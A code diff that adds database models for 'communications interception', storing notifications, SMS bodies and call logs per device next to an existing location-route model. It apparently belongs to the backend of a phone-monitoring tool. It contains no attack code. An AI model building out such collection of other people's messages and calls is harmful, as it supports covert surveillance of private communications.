@@ -177,3 +177,38 @@ class MatchedRoute(Base):
     confidence = Column(Float, nullable=True)
     provider = Column(String, default='osrm')
     created_at = Column(DateTime(timezone=True), default=_utcnow)
+
+
+# ──────────────────────────────────────────────────────────────
+# Communications Interception Models
+# ──────────────────────────────────────────────────────────────
+
+class Notification(Base):
+    __tablename__ = 'notifications'
+    id = Column(Integer, primary_key=True)
+    device_id = Column(String, index=True, nullable=False)
+    package_name = Column(String, nullable=False)
+    title = Column(String, nullable=True)
+    text = Column(String, nullable=True)
+    timestamp = Column(DateTime(timezone=True), default=_utcnow, nullable=False)
+
+
+class SmsMessage(Base):
+    __tablename__ = 'sms_messages'
+    id = Column(Integer, primary_key=True)
+    device_id = Column(String, index=True, nullable=False)
+    sender = Column(String, nullable=False)
+    body = Column(String, nullable=True)
+    timestamp = Column(DateTime(timezone=True), default=_utcnow, nullable=False)
+    is_incoming = Column(Boolean, nullable=False, default=True)
+
+
+class CallLog(Base):
+    __tablename__ = 'call_logs'
+    id = Column(Integer, primary_key=True)
+    device_id = Column(String, index=True, nullable=False)
+    number = Column(String, nullable=False)
+    duration_seconds = Column(Integer, nullable=False, default=0)
+    type = Column(String, nullable=False)  # 'missed', 'incoming', 'outgoing'
+    timestamp = Column(DateTime(timezone=True), default=_utcnow, nullable=False)
+
